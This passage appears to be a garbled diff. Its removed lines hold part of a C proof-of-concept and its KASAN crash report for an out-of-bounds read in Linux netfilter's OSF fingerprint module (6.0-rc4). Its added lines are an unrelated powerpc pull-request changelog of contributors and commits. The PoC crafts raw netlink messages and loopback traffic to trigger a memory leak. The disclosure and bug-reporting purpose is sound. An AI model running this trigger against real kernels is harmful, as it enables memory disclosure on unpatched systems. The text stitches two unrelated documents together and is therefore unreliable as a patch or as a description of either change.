+ - Add support for the "nohlt" command line option to disable CPU idle.
 
-	memset(&servaddr, 0, sizeof(servaddr));
+ - Add support for -fpatchable-function-entry for ftrace, with GCC >=3D 13.=
+1.
 
-	servaddr.sin_family    = AF_INET;
-	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
-	servaddr.sin_port = htons(6146);
+ - Rework memory block size determination, and support 256MB size on systems
+   with GPUs that have hotpluggable memory.
 
-	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
-		  sizeof(servaddr)) < 0 ){
-		perror("bind failed");
-		exit(EXIT_FAILURE);
-	}
+ - Various other small features and fixes.
 
-	int yes = 1;
-	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
-		       sizeof(int)) == -1) {
-		perror("setsockopt failed");
-		exit(EXIT_FAILURE);
-	}
+Thanks to: Andrew Donnellan, Aneesh Kumar K.V, Arnd Bergmann, Athira Rajeev,
+Benjamin Gray, Christophe Leroy, Frederic Barrat, Gautam Menghani, Geoff Le=
+vand,
+Hari Bathini, Immad Mir, Jialin Zhang, Joel Stanley, Jordan Niethe, Justin
+Stitt, Kajol Jain, Kees Cook, Krzysztof Kozlowski, Laurent Dufour, Liang He,
+Linus Walleij, Mahesh Salgaonkar, Masahiro Yamada, Michal Suchanek, Nageswa=
+ra
+R Sastry, Nathan Chancellor, Nathan Lynch, Naveen N Rao, Nicholas Piggin, N=
+ick
+Desaulniers, Omar Sandoval, Randy Dunlap, Reza Arbab, Rob Herring, Russell
+Currey, Sourabh Jain, Thomas Gleixner, Trevor Woerner, Uwe Kleine-K=C3=B6ni=
+g, Vaibhav
+Jain, Xiongfeng Wang, Yuan Tan, Zhang Rui, Zheng Zengkai.
 
-	if ((listen(sockfd, 1)) < 0) {
-		perror("listen failed");
-		exit(EXIT_FAILURE);
-	}
+- ------------------------------------------------------------------
+Aneesh Kumar K.V (3):
+      powerpc/mm: Cleanup memory block size probing
+      powerpc/mm/book3s64: Fix build error with SPARSEMEM disabled
+      powerpc/mm/book3s64: Use 256M as the upper limit with coherent device=
+ memory attached
 
-	connfd = accept(sockfd, NULL, 0);
-	if (connfd < 0) {
-		perror("accept failed");
-		exit(EXIT_FAILURE);
-	}
-	len = 0;
+Arnd Bergmann (4):
+      powerpc: address missing-prototypes warnings
+      powerpc: mark more local variables as volatile
+      powerpc: xmon: remove unused variables
+      macintosh/ams: mark ams_init() static
 
-	while(1)
-	{
-		if(len >= 128)
-			break;
-		n = read(connfd, data + len, 128-len);
-		len += n;
-	}
+Benjamin Gray (11):
+      selftests/powerpc/ptrace: Explain why tests are skipped
+      selftests/powerpc/ptrace: Fix typo in pid_max search error
+      selftests/powerpc/ptrace: Declare test temporary variables as volatile
+      powerpc/watchpoints: Explain thread_change_pc() more
+      powerpc/watchpoints: Don't track info persistently
+      powerpc/watchpoints: Track perf single step directly on the breakpoint
+      powerpc/watchpoints: Simplify watchpoint reinsertion
+      powerpc/watchpoints: Remove ptrace/perf exclusion tracking
+      selftests/powerpc/ptrace: Update ptrace-perf watchpoint selftest
+      perf/hw_breakpoint: Remove arch breakpoint hooks
+      Documentation/powerpc: Fix ptrace request names
 
-	close(sockfd);
-	close(connfd);
+Christophe Leroy (35):
+      powerpc/kuap: Avoid unnecessary reads of MD_AP
+      powerpc/kuap: Avoid useless jump_label on empty function
+      powerpc/kuap: Fold kuep_is_disabled() into its only user
+      powerpc/features: Add capability to update mmu features later
+      powerpc/kuap: MMU_FTR_BOOK3S_KUAP becomes MMU_FTR_KUAP
+      powerpc/kuap: Use MMU_FTR_KUAP on all and refactor disabling kuap
+      powerpc/kuap: Simplify KUAP lock/unlock on BOOK3S/32
+      powerpc/kuap: KUAP enabling/disabling functions must be __always_inli=
+ne
+      powerpc/kuap: Use ASM feature fixups instead of static branches
+      powerpc/radix: Move some functions into #ifdef CONFIG_KVM_BOOK3S_HV_P=
+OSSIBLE
+      powerpc/include: Remove unneeded #include <asm/fs_pd.h>
+      powerpc/include: Declare mpc8xx_immr in 8xx_immap.h
+      powerpc/include: Remove mpc8260.h and m82xx_pci.h
+      powerpc: Remove CONFIG_PCI_8260
+      powerpc/8xx: Remove immr_map() and immr_unmap()
+      powerpc/cpm2: Remove cpm2_map() and cpm2_unmap()
+      powerpc/step: Mark __copy_mem_out() and __emulate_dcbz() __always_inl=
+ine
+      powerpc/reg: Remove #ifdef around mtspr macro
+      powerpc/ptrace: Split gpr32_set_common
+      powerpc/512x: Make mpc512x_select_reset_compat() static
+      powerpc/fsl_pci: Make fsl_add_bridge() static
+      powerpc/83xx: Fix style problems in usb.c and remove unneccessary inc=
+ludes from mpc83xx.h
+      powerpc/83xx: Split usb.c
+      powerpc/82xx: Remove pq2_init_pci
+      powerpc/82xx: Remove CONFIG_8260 and CONFIG_8272
+      powerpc/8xx: Remove init_internal_rtc() to fix no previous prototype =
+error
+      powerpc/32s: Cleanup the mess in __set_pte_at()
+      powerpc/4xx: Remove WatchdogHandler() to fix no previous prototype er=
+ror
+      powerpc/4xx: Remove pika_dtm_[un]register_shutdown() to fix no previo=
+us prototype
+      powerpc/47x: Remove early_init_mmu_47x() to fix no previous prototype
+      powerpc/47x: Add prototype for mmu_init_secondary()
+      powerpc/4xx: Add missing includes to fix no previous prototype errors
+      powerpc/perf: Convert fsl_emb notifier to state machine callbacks
+      powerpc/64e: Fix circular dependency with CONFIG_SMP disabled
+      powerpc/85xx: Mark some functions static and add missing includes to =
+fix no previous prototype error
 
-	return NULL;
-}
+Gautam Menghani (1):
+      powerpc/xics: Remove unnecessary endian conversion
 
-int tcp_connect()
-{
-	int sockfd;
-	struct sockaddr_in servaddr;
-	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
-		perror("socket creation failed");
-		exit(EXIT_FAILURE);
-	}
-	memset(&servaddr, 0, sizeof(servaddr));
+Hari Bathini (1):
+      powerpc/fadump: invoke ibm,os-term with rtas_call_unlocked()
 
-	servaddr.sin_family    = AF_INET;
-	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
-	servaddr.sin_port = htons(6146);
+Immad Mir (1):
+      powerpc/powernv: fix debugfs_create_dir() error checking
 
-	if (connect(sockfd,  (const struct sockaddr *)&servaddr,
-		    sizeof(servaddr)) != 0) {
-		perror("connect failed");
-		exit(EXIT_FAILURE);
-	}
-	return sockfd;
-}
+Jialin Zhang (1):
+      powerpc/eeh: Use pci_dev_id() to simplify the code
 
-int add_osf()
-{
-	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
-	if (fd == -1) {
-                errx(EXIT_FAILURE, "socket failed");
-        }
+Joel Stanley (1):
+      powerpc/config: Disable SLAB_DEBUG_ON in skiroot
 
-	char iobuf1[0x268] = {0};
-	*(uint32_t*)(iobuf1) = 0x268;
-	*(uint8_t*)(iobuf1+4) = 0;
-	*(uint8_t*)(iobuf1+5) = 0x5;
-	*(uint16_t*)(iobuf1+6) = 0x405;
-	*(uint32_t*)(iobuf1+8) = 0x63064c36;
-	*(uint32_t*)(iobuf1+0x10) = 0;
+Justin Stitt (1):
+      powerpc/ps3: refactor strncpy usage
 
-	*(uint16_t*)(iobuf1+0x14) = 0x254;
-	*(uint16_t*)(iobuf1+0x16) = 1;
-	*(uint32_t*)(iobuf1+0x18) = 1;
-	*(uint32_t*)(iobuf1+0x1c) = 4;
-	*(uint8_t*)(iobuf1+0x20) = 2;
-	*(uint8_t*)(iobuf1+0x21) = 0x1;
-	*(uint16_t*)(iobuf1+0x22) = 0xb4;
-	*(uint16_t*)(iobuf1+0x24) = 0;
-	*(uint16_t*)(iobuf1+0x26) = 0xff;
-	strcpy((void*)(iobuf1+0x28), "Windows");
-	strcpy((void*)(iobuf1+0x48), "98");
-	*(uint16_t*)(iobuf1+0x88) = 2;
-	*(uint16_t*)(iobuf1+0x8a) = 4;
-	*(uint16_t*)(iobuf1+0x94) = 1;
-	*(uint16_t*)(iobuf1+0x96) = 1;
-	*(uint16_t*)(iobuf1+0xa0) = 1;
-	*(uint16_t*)(iobuf1+0xa2) = 1;
-	*(uint16_t*)(iobuf1+0xac) = 4;
-	*(uint16_t*)(iobuf1+0xae) = 2;
-	struct iovec io1 = {
-		.iov_base = iobuf1,
-		.iov_len = sizeof(iobuf1)
-	};
-	struct msghdr msg1 = {0};
-	msg1.msg_iov = &io1;
-	msg1.msg_iovlen = 1;
-	sendmsg(fd, &msg1, 0);
+Kajol Jain (10):
+      powerpc/hv_gpci: Add sysfs file inside hv_gpci device to show process=
+or bus topology information
+      docs: ABI: sysfs-bus-event_source-devices-hv_gpci: Document processor=
+_bus_topology sysfs interface file
+      powerpc/hv_gpci: Add sysfs file inside hv_gpci device to show process=
+or config information
+      docs: ABI: sysfs-bus-event_source-devices-hv_gpci: Document processor=
+_config sysfs interface file
+      powerpc/hv_gpci: Add sysfs file inside hv_gpci device to show affinit=
+y domain via virtual processor information
+      docs: ABI: sysfs-bus-event_source-devices-hv_gpci: Document affinity_=
+domain_via_virtual_processor sysfs interface file
+      powerpc/hv_gpci: Add sysfs file inside hv_gpci device to show affinit=
+y domain via domain information
+      docs: ABI: sysfs-bus-event_source-devices-hv_gpci: Document affinity_=
+domain_via_domain sysfs interface file
+      powerpc/hv_gpci: Add sysfs file inside hv_gpci device to show affinit=
+y domain via partition information
+      docs: ABI: sysfs-bus-event_source-devices-hv_gpci: Document affinity_=
+domain_via_partition sysfs interface file
 
-	return 0;
-}
+Krzysztof Kozlowski (1):
+      powerpc: dts: add missing space before {
 
-int main(int argc, char *argv[])
-{
-	add_osf();
+Laurent Dufour (1):
+      powerpc/kexec: fix minor typo
 
-	int tid, status;
-	pthread_t p_thread;
-	int sockfd;
-	char buf[128] = {0};
+Liang He (1):
+      powerpc/mpc5xxx: Add missing fwnode_handle_put()
 
-	printf("[+] Create tcp communication\n");
-	tid = pthread_create(&p_thread, NULL, tcp_recv, (void *)buf);
-	printf("  [-] wait 1sec for server\n");
-	usleep(10000);
-	printf("  [-] connect to server\n");
-	sockfd = tcp_connect();
+Linus Walleij (1):
+      powerpc: Make virt_to_pfn() a static inline
 
-	printf("[+] Install Filter for leak\n");
-	install_filter_for_leak();
+Mahesh Salgaonkar (2):
+      powerpc/rtas: export rtas_error_rc() for reuse.
+      PCI: rpaphp: Error out on busy status from get-sensor-state
 
-	printf("[+] Send packet and read data\n");
-	write(sockfd, buf, 128);
-	pthread_join(p_thread, (void **)&status);
+Masahiro Yamada (3):
+      powerpc: remove unneeded #include <asm/export.h>
+      powerpc: replace #include <asm/export.h> with #include <linux/export.=
+h>
+      powerpc: remove <asm/export.h>
 
-	printf("[+] Remove filter\n");
-	int fd1 = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
-        char iobuf1[0x48] = {0};
-	*(uint32_t*)(iobuf1) = 0x14;
-	*(uint16_t*)(iobuf1+4) = 0x10;
-	*(uint16_t*)(iobuf1+6) = 1;
-	*(uint32_t*)(iobuf1+8) = 0x63072925;
-	*(uint16_t*)(iobuf1+0x12) = 0xa;
-	*(uint16_t*)(iobuf1+0x14) = 0x20;
-	*(uint16_t*)(iobuf1+0x18) = 0xa02;
-	*(uint16_t*)(iobuf1+0x1a) = 0x5;
-	*(uint32_t*)(iobuf1+0x1c) = 0x63072926;
-	*(uint32_t*)(iobuf1+0x24) = 2;
-	*(uint16_t*)(iobuf1+0x28) = 0xb;
-	*(uint16_t*)(iobuf1+0x2a) = 1;
-	strcpy((void*)(iobuf1+0x2c), "filter");
-	*(uint32_t*)(iobuf1+0x34) = 0x14;
-	*(uint16_t*)(iobuf1+0x38) = 0x11;
-	*(uint16_t*)(iobuf1+0x3a) = 1;
-	*(uint32_t*)(iobuf1+0x3c) = 0x63072927;
-	*(uint16_t*)(iobuf1+0x46) = 0xa;
-        struct iovec io1 = {
-		.iov_base = iobuf1,
-		.iov_len = sizeof(iobuf1)
-        };
-        struct msghdr msg1 = {0};
-        msg1.msg_iov = &io1;
-        msg1.msg_iovlen = 1;
-        sendmsg(fd1, &msg1, 0);
+Michael Ellerman (15):
+      powerpc/64: Enable accelerated crypto algorithms in defconfig
+      Merge tag 'smp-core-for-ppc-23-07-28' of https://git.kernel.org/pub/s=
+cm/linux/kernel/git/tip/tip into topic/cpu-smt
+      powerpc/pseries: Initialise CPU hotplug callbacks earlier
+      powerpc: Add HOTPLUG_SMT support
+      powerpc/pseries: Honour current SMT state when DLPAR onlining CPUs
+      Merge branch 'topic/cpu-smt' into next
+      powerpc/powernv: Fix fortify source warnings in opal-prd.c
+      powerpc/powernv: Use struct opal_prd_msg in more places
+      powerpc: Drop zalloc_maybe_bootmem()
+      cxl: Drop unused detach_spa()
+      powerpc/pseries: Move VPHN constants into vphn.h
+      powerpc/pseries: Move hcall_vphn() prototype into vphn.h
+      powerpc: Don't include lppaca.h in paca.h
+      powerpc/powermac: Fix unused function warning
+      powerpc/64s: Move CPU -mtune options into Kconfig
 
-	return 0;
-}
+Michal Suchanek (1):
+      powerpc: Move DMA64_PROPNAME define to a header
 
-KASAN report:
+Nathan Lynch (2):
+      powerpc/selftests: sort mm/.gitignore, add exec_prot
+      selftests/powerpc: add const qualification where possible
 
-==================================================================
-BUG: KASAN: slab-out-of-bounds in nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
-Read of size 2 at addr ffff88804bc64272 by task poc/6431
+Naveen N Rao (16):
+      powerpc/ftrace: Fix dropping weak symbols with older toolchains
+      powerpc/module: Remove unused .ftrace.tramp section
+      powerpc64/ftrace: Move ELFv1 and -pg support code into a separate file
+      powerpc/ftrace: Simplify function_graph support in ftrace.c
+      powerpc/ftrace: Use FTRACE_REGS_ADDR to identify the correct ftrace t=
+rampoline
+      powerpc/ftrace: Extend ftrace support for large kernels to ppc32
+      powerpc/ftrace: Consolidate ftrace support into fewer files
+      powerpc/ftrace: Refactor ftrace_modify_code()
+      powerpc/ftrace: Stop re-purposing linker generated long branches for =
+ftrace
+      powerpc/ftrace: Add separate ftrace_init_nop() with additional valida=
+tion
+      powerpc/ftrace: Simplify ftrace_make_nop()
+      powerpc/ftrace: Simplify ftrace_make_call()
+      powerpc/ftrace: Simplify ftrace_modify_call()
+      powerpc/ftrace: Replace use of ftrace_call_replace() with ftrace_crea=
+te_branch_inst()
+      powerpc/ftrace: Implement ftrace_replace_code()
+      powerpc/ftrace: Add support for -fpatchable-function-entry
 
-CPU: 1 PID: 6431 Comm: poc Not tainted 6.0.0-rc4 #1
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
-Call Trace:
- <IRQ>
- __dump_stack linux-6.0-rc4/lib/dump_stack.c:88
- dump_stack_lvl+0xcd/0x134 linux-6.0-rc4/lib/dump_stack.c:106
- print_address_description linux-6.0-rc4/mm/kasan/report.c:317
- print_report.cold+0x2ba/0x6e9 linux-6.0-rc4/mm/kasan/report.c:433
- kasan_report+0xb1/0x1e0 linux-6.0-rc4/mm/kasan/report.c:495
- nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
- nf_osf_find+0x186/0x2f0 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:281
- nft_osf_eval+0x37f/0x590 linux-6.0-rc4/net/netfilter/nft_osf.c:47
- expr_call_ops_eval linux-6.0-rc4/net/netfilter/nf_tables_core.c:214
- nft_do_chain+0x2b0/0x1490 linux-6.0-rc4/net/netfilter/nf_tables_core.c:264
- nft_do_chain_ipv4+0x17c/0x1f0 linux-6.0-rc4/net/netfilter/nft_chain_filter.c:23
- nf_hook_entry_hookfn linux-6.0-rc4/./include/linux/netfilter.h:142
- nf_hook_slow+0xc5/0x1f0 linux-6.0-rc4/net/netfilter/core.c:620
- nf_hook linux-6.0-rc4/./include/linux/netfilter.h:262
- NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:305
- ip_local_deliver+0x2f5/0x4e0 linux-6.0-rc4/net/ipv4/ip_input.c:254
- dst_input linux-6.0-rc4/./include/net/dst.h:461
- ip_rcv_finish+0x1cb/0x2f0 linux-6.0-rc4/net/ipv4/ip_input.c:444
- NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:307
- NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:301
- ip_rcv+0xc4/0x3b0 linux-6.0-rc4/net/ipv4/ip_input.c:564
- __netif_receive_skb_one_core+0x114/0x180 linux-6.0-rc4/net/core/dev.c:5485
- __netif_receive_skb+0x1f/0x1c0 linux-6.0-rc4/net/core/dev.c:5599
- process_backlog+0x13a/0x690 linux-6.0-rc4/net/core/dev.c:5927
- __napi_poll.constprop.0+0xaf/0x430 linux-6.0-rc4/net/core/dev.c:6511
- napi_poll linux-6.0-rc4/net/core/dev.c:6578
- net_rx_action+0x8d2/0xc60 linux-6.0-rc4/net/core/dev.c:6689
- __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
- do_softirq linux-6.0-rc4/kernel/softirq.c:472
- do_softirq+0x101/0x140 linux-6.0-rc4/kernel/softirq.c:459
- </IRQ>
- <TASK>
- __local_bh_enable_ip+0xf4/0x110 linux-6.0-rc4/kernel/softirq.c:396
- local_bh_enable linux-6.0-rc4/./include/linux/bottom_half.h:33
- rcu_read_unlock_bh linux-6.0-rc4/./include/linux/rcupdate.h:776
- ip_finish_output2+0x7d6/0x21a0 linux-6.0-rc4/net/ipv4/ip_output.c:229
- __ip_finish_output linux-6.0-rc4/net/ipv4/ip_output.c:306
- __ip_finish_output+0x396/0x650 linux-6.0-rc4/net/ipv4/ip_output.c:288
- ip_finish_output+0x2d/0x280 linux-6.0-rc4/net/ipv4/ip_output.c:316
- NF_HOOK_COND linux-6.0-rc4/./include/linux/netfilter.h:296
- ip_output+0x20a/0x620 linux-6.0-rc4/net/ipv4/ip_output.c:430
- dst_output linux-6.0-rc4/./include/net/dst.h:451
- ip_local_out linux-6.0-rc4/net/ipv4/ip_output.c:126
- __ip_queue_xmit+0x8de/0x1bd0 linux-6.0-rc4/net/ipv4/ip_output.c:532
- __tcp_transmit_skb+0x195b/0x3820 linux-6.0-rc4/net/ipv4/tcp_output.c:1402
- tcp_transmit_skb linux-6.0-rc4/net/ipv4/tcp_output.c:1420
- tcp_write_xmit+0xd9b/0x5f70 linux-6.0-rc4/net/ipv4/tcp_output.c:2691
- __tcp_push_pending_frames+0xaa/0x380 linux-6.0-rc4/net/ipv4/tcp_output.c:2875
- tcp_push+0x49b/0x720 linux-6.0-rc4/net/ipv4/tcp.c:728
- tcp_sendmsg_locked+0x2480/0x2fc0 linux-6.0-rc4/net/ipv4/tcp.c:1455
- tcp_sendmsg+0x2b/0x40 linux-6.0-rc4/net/ipv4/tcp.c:1483
- inet_sendmsg+0x99/0xe0 linux-6.0-rc4/net/ipv4/af_inet.c:819
- sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
- sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
- sock_write_iter+0x291/0x3d0 linux-6.0-rc4/net/socket.c:1108
- call_write_iter linux-6.0-rc4/./include/linux/fs.h:2187
- new_sync_write linux-6.0-rc4/fs/read_write.c:491
- vfs_write+0x9ef/0xde0 linux-6.0-rc4/fs/read_write.c:578
- ksys_write+0x1e8/0x250 linux-6.0-rc4/fs/read_write.c:631
- do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
- do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
-RIP: 0033:0x7f1674040fef
-Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 29 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 31 44 89 c7 48 89 44 24 08 e8 5c fd ff ff 48
-RSP: 002b:00007ffe90523f50 EFLAGS: 00000293 ORIG_RAX: 0000000000000001
-RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1674040fef
-RDX: 0000000000000080 RSI: 00007ffe90524030 RDI: 0000000000000006
-RBP: 00007ffe905240d0 R08: 0000000000000000 R09: 0000000000000000
-R10: 0000560534f9b61f R11: 0000000000000293 R12: 0000560534f9c1b0
-R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
- </TASK>
+Nicholas Piggin (6):
+      powerpc: Account mm_cpumask and active_cpus in init_mm
+      powerpc/64s: Use dec_mm_active_cpus helper
+      powerpc: Add mm_cpumask warning when context switching
+      powerpc/64s/radix: combine final TLB flush and lazy tlb mm shootdown =
+IPIs
+      powerpc/pseries: Fix hcall tracepoints with JUMP_LABEL=3Dn
+      powerpc/pseries: Remove unused hcall tracing instruction
 
-Allocated by task 6431:
- kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
- kasan_set_track linux-6.0-rc4/mm/kasan/common.c:45
- set_alloc_info linux-6.0-rc4/mm/kasan/common.c:437
- ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:516
- ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:475
- __kasan_kmalloc+0xa6/0xd0 linux-6.0-rc4/mm/kasan/common.c:525
- kasan_kmalloc linux-6.0-rc4/./include/linux/kasan.h:234
- kmem_cache_alloc_trace+0x25a/0x460 linux-6.0-rc4/mm/slab.c:3559
- kmalloc linux-6.0-rc4/./include/linux/slab.h:600
- nfnl_osf_add_callback+0x11f/0x550 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:316
- nfnetlink_rcv_msg+0xbcf/0x13f0 linux-6.0-rc4/net/netfilter/nfnetlink.c:300
- netlink_rcv_skb+0x153/0x420 linux-6.0-rc4/net/netlink/af_netlink.c:2501
- nfnetlink_rcv+0x1ac/0x420 linux-6.0-rc4/net/netfilter/nfnetlink.c:658
- netlink_unicast_kernel linux-6.0-rc4/net/netlink/af_netlink.c:1319
- netlink_unicast+0x543/0x7f0 linux-6.0-rc4/net/netlink/af_netlink.c:1345
- netlink_sendmsg+0x918/0xe20 linux-6.0-rc4/net/netlink/af_netlink.c:1921
- sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
- sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
- ____sys_sendmsg+0x6e6/0x800 linux-6.0-rc4/net/socket.c:2482
- ___sys_sendmsg+0x11d/0x1b0 linux-6.0-rc4/net/socket.c:2536
- __sys_sendmsg+0xfa/0x1d0 linux-6.0-rc4/net/socket.c:2565
- do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
- do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+Nick Desaulniers (3):
+      powerpc/inst: add PPC_TLBILX_LPID
+      Revert "powerpc/xmon: Relax frame size for clang"
+      powerpc/xmon: Reapply "Relax frame size for clang"
 
-Last potentially related work creation:
- kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
- __kasan_record_aux_stack+0x7e/0x90 linux-6.0-rc4/mm/kasan/generic.c:348
- kvfree_call_rcu+0x74/0x940 linux-6.0-rc4/kernel/rcu/tree.c:3322
- put_css_set_locked linux-6.0-rc4/kernel/cgroup/cgroup.c:988
- put_css_set_locked+0xa9c/0x1000 linux-6.0-rc4/kernel/cgroup/cgroup.c:954
- put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:211
- put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:198
- cgroup_free+0x83/0x1b0 linux-6.0-rc4/kernel/cgroup/cgroup.c:6525
- __put_task_struct+0x113/0x3d0 linux-6.0-rc4/kernel/fork.c:840
- put_task_struct linux-6.0-rc4/./include/linux/sched/task.h:119
- delayed_put_task_struct+0x1f1/0x330 linux-6.0-rc4/kernel/exit.c:177
- rcu_do_batch linux-6.0-rc4/kernel/rcu/tree.c:2245
- rcu_core+0x7bb/0x1850 linux-6.0-rc4/kernel/rcu/tree.c:2505
- __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
+Omar Sandoval (2):
+      powerpc/crypto: fix missing skcipher dependency for aes-gcm-p10
+      powerpc/crypto: don't build aes-gcm-p10 by default
 
-The buggy address belongs to the object at ffff88804bc64000
- which belongs to the cache kmalloc-1k of size 1024
-The buggy address is located 626 bytes inside of
- 1024-byte region [ffff88804bc64000, ffff88804bc64400)
+Randy Dunlap (2):
+      powerpc/pseries: PLPKS: undo kernel-doc comment notation
+      macintosh/ams: linux/platform_device.h is needed
 
-The buggy address belongs to the physical page:
-page:ffffea00012f1900 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4bc64
-flags: 0x4fff00000000200(slab|node=1|zone=1|lastcpupid=0x7ff)
-raw: 04fff00000000200 ffffea0001023808 ffffea00012f1f08 ffff888011840700
-raw: 0000000000000000 ffff88804bc64000 0000000100000002 0000000000000000
-page dumped because: kasan: bad access detected
-page_owner tracks the page as allocated
-page last allocated via order 0, migratetype Unmovable, gfp_mask 0x2420c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_THISNODE), pid 1, tgid 1 (systemd), ts 22208538581, free_ts 22201347598
- prep_new_page linux-6.0-rc4/mm/page_alloc.c:2532
- get_page_from_freelist+0x1082/0x2ae0 linux-6.0-rc4/mm/page_alloc.c:4283
- __alloc_pages+0x1c7/0x510 linux-6.0-rc4/mm/page_alloc.c:5515
- __alloc_pages_node linux-6.0-rc4/./include/linux/gfp.h:243
- kmem_getpages linux-6.0-rc4/mm/slab.c:1363
- cache_grow_begin+0x75/0x370 linux-6.0-rc4/mm/slab.c:2569
- cache_alloc_refill+0x27e/0x380 linux-6.0-rc4/mm/slab.c:2942
- ____cache_alloc linux-6.0-rc4/mm/slab.c:3018
- ____cache_alloc linux-6.0-rc4/mm/slab.c:3001
- slab_alloc_node linux-6.0-rc4/mm/slab.c:3220
- kmem_cache_alloc_node_trace+0x4f5/0x560 linux-6.0-rc4/mm/slab.c:3601
- __do_kmalloc_node linux-6.0-rc4/mm/slab.c:3623
- __kmalloc_node+0x38/0x60 linux-6.0-rc4/mm/slab.c:3631
- kmalloc_node linux-6.0-rc4/./include/linux/slab.h:623
- kvmalloc_node+0x3e/0x190 linux-6.0-rc4/mm/util.c:613
- kvzalloc_node linux-6.0-rc4/./include/linux/slab.h:754
- alloc_shrinker_info+0xe9/0x290 linux-6.0-rc4/mm/vmscan.c:282
- mem_cgroup_css_online+0x182/0x470 linux-6.0-rc4/mm/memcontrol.c:5292
- online_css+0xaf/0x2a0 linux-6.0-rc4/kernel/cgroup/cgroup.c:5334
- css_create linux-6.0-rc4/kernel/cgroup/cgroup.c:5405
- cgroup_apply_control_enable+0x69f/0xc00 linux-6.0-rc4/kernel/cgroup/cgroup.c:3204
- cgroup_mkdir+0x5a0/0x1300 linux-6.0-rc4/kernel/cgroup/cgroup.c:5602
- kernfs_iop_mkdir+0x146/0x1d0 linux-6.0-rc4/fs/kernfs/dir.c:1185
- vfs_mkdir+0x3a9/0x650 linux-6.0-rc4/fs/namei.c:4013
- do_mkdirat+0x28c/0x310 linux-6.0-rc4/fs/namei.c:4038
- __do_sys_mkdir linux-6.0-rc4/fs/namei.c:4058
- __se_sys_mkdir linux-6.0-rc4/fs/namei.c:4056
- __x64_sys_mkdir+0xf2/0x140 linux-6.0-rc4/fs/namei.c:4056
-page last free stack trace:
- reset_page_owner linux-6.0-rc4/./include/linux/page_owner.h:24
- free_pages_prepare linux-6.0-rc4/mm/page_alloc.c:1449
- free_pcp_prepare+0x4b0/0xb50 linux-6.0-rc4/mm/page_alloc.c:1499
- free_unref_page_prepare linux-6.0-rc4/mm/page_alloc.c:3380
- free_unref_page+0x19/0x520 linux-6.0-rc4/mm/page_alloc.c:3476
- tlb_batch_list_free linux-6.0-rc4/mm/mmu_gather.c:74
- tlb_finish_mmu+0x1a3/0x7e0 linux-6.0-rc4/mm/mmu_gather.c:356
- exit_mmap+0x1d2/0x480 linux-6.0-rc4/mm/mmap.c:3118
- __mmput+0x122/0x4b0 linux-6.0-rc4/kernel/fork.c:1187
- mmput+0x56/0x60 linux-6.0-rc4/kernel/fork.c:1208
- exit_mm linux-6.0-rc4/kernel/exit.c:510
- do_exit+0x9d9/0x29b0 linux-6.0-rc4/kernel/exit.c:782
- do_group_exit+0xd2/0x2f0 linux-6.0-rc4/kernel/exit.c:925
- __do_sys_exit_group linux-6.0-rc4/kernel/exit.c:936
- __se_sys_exit_group linux-6.0-rc4/kernel/exit.c:934
- __x64_sys_exit_group+0x3a/0x50 linux-6.0-rc4/kernel/exit.c:934
- do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
- do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+Rob Herring (1):
+      powerpc: Explicitly include correct DT includes
 
-Memory state around the buggy address:
- ffff88804bc64100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
- ffff88804bc64180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
->ffff88804bc64200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
-                                                             ^
- ffff88804bc64280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
- ffff88804bc64300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+Russell Currey (2):
